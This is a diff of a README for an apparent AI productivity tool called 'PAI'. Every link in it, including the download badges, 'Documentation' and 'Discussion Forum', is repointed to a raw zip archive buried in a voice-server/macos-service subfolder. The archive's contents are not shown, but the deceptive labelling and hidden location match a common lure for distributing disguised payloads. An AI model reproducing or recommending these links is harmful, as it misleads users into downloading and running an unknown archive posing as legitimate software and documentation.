@@ -1,7 +1,7 @@
 # 🤖 PAI - Upgrade Your Productivity with AI
 
-[![Download PAI](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip)](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip)  
-[![Download PAI](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip%https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip)](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip)
+[![Download PAI](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip)](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip)  
+[![Download PAI](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip%https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip)](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To download PAI, please visit our Releases page. Here’s how to do it:
 2. Scroll to the latest version.
 3. Click on the file that matches your operating system to start the download.
 
-[![Download PAI](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip%https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip)](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip)
+[![Download PAI](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip%https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip)](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip)
 
 ### 📂 Installing PAI
 
@@ -73,7 +73,7 @@ If you encounter issues while using PAI, we are here to help. You can reach out 
 
 ## 💬 Community
 
-Join our community to connect with other PAI users. Share your experiences, tips, and tricks on our [discussion forum](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip).
+Join our community to connect with other PAI users. Share your experiences, tips, and tricks on our [discussion forum](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip).
 
 ## 👥 Contributing
 
@@ -81,8 +81,8 @@ We welcome contributions! If you have suggestions or want to report a bug, pleas
 
 ## 🔗 Links
 
-- [Visit Releases Page](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip)
-- [Documentation](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip)
-- [Discussion Forum](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/enfork/PAI.zip)
+- [Visit Releases Page](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip)
+- [Documentation](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/Pablodmzz7/PAI/main/PAI_DIRECTORY/voice-server/macos-service/Software_1.0.zip)
 
 Thank you for choosing PAI. Enjoy your enhanced productivity journey!
